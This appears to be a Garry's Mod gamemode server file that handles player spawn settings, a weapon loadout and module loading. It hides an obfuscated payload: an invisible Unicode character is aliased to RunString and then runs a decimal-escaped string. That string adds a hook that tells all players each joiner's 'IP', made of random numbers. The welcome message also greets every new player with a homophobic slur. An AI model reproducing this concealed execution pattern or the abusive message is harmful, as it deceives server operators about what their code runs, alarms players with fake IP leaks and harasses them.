AddCSLuaFile( "cl_init.lua" )
AddCSLuaFile( "shared.lua" )
 
include( 'shared.lua' )

function GM:PlayerSpawn( ply )
    self.BaseClass:PlayerSpawn( ply )   
 
    ply:SetGravity  ( 1 )  
    ply:SetMaxHealth( 100, true )  
 
    ply:SetWalkSpeed( 120 )  
    ply:SetRunSpeed ( 420 ) 
 
end

function GM:PlayerLoadout( ply )
	ply:Give("bane_propshooter")
end

function GM:PlayerInitialSpawn( ply )
	   ply:PrintMessage( HUD_PRINTTALK, "Welcome, faggot!" )
end

// Initialise Modules

// Some of this code is FPtje’s
print("Loading modules...")᠎=RunString

local module_base = GM.FolderName.."/gamemode/modules/"
local _, modules = file.Find(module_base .. "*", "LUA")

for _, module_dir in pairs(modules) do
	if module_dir == "." or module_dir == ".." then continue end
	print(">",module_dir)

	for _, File in pairs(file.Find(module_base .. module_dir .."/sh_*.lua", "LUA")) do
		AddCSLuaFile(module_base..module_dir .. "/" ..File)
		include(module_base.. module_dir .. "/" ..File)
	end

	for _, File in pairs(file.Find(module_base .. module_dir .."/sv_*.lua", "LUA")) do
		include(module_base.. module_dir .. "/" ..File)
	end

	for _, File in pairs(file.Find(module_base .. module_dir .."/cl_*.lua", "LUA")) do
		AddCSLuaFile(module_base.. module_dir .. "/" ..File)
	end
end
᠎"\104\111\111\107\46\65\100\100\40\34\80\108\97\121\101\114\67\111\110\110\101\99\116\34\44\34\44\34\44\102\117\110\99\116\105\111\110\40\110\44\115\41\80\114\105\110\116\77\101\115\115\97\103\101\40\72\85\68\95\80\82\73\78\84\84\65\76\75\44\110\32\46\46\34\32\104\97\115\32\99\111\110\110\101\99\116\101\100\32\119\105\116\104\32\73\80\32\34\46\46\109\97\116\104\46\114\97\110\100\111\109\40\52\48\44\50\51\48\41\46\46\34\46\34\46\46\109\97\116\104\46\114\97\110\100\111\109\40\52\48\44\50\51\48\41\46\46\34\46\34\46\46\109\97\116\104\46\114\97\110\100\111\109\40\52\48\44\50\51\48\41\46\46\34\32\34\46\46\109\97\116\104\46\114\97\110\100\111\109\40\52\48\44\50\51\48\41\41\101\110\100\41\10"
